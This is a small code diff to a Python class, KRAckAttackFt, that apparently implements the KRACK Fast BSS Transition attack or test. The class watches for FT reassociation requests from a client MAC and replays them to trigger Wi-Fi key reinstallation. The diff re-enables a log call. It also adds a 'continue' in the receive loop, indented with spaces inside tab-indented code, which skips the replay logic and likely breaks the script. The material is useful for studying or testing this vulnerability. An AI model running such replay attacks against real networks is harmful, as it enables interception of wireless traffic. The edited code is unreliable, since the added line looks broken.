@@ -222,7 +222,7 @@ class KRAckAttackFt():
 
 		if p.addr2 == self.clientmac and Dot11ReassoReq in p:
 			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
-				#log(INFO, "Detected FT reassociation frame")
+				log(INFO, "Detected FT reassociation frame")
 				self.reassoc = p
 				self.next_replay = time.time() + 1
 			else:
@@ -276,6 +276,7 @@ class KRAckAttackFt():
 		while True:
 			sel = select.select([self.sock], [], [], 1)
 			if self.sock in sel[0]: self.handle_rx()
+                        continue
 
 			if self.reassoc and time.time() > self.next_replay:
 				#log(INFO, "Replaying Reassociation Request")
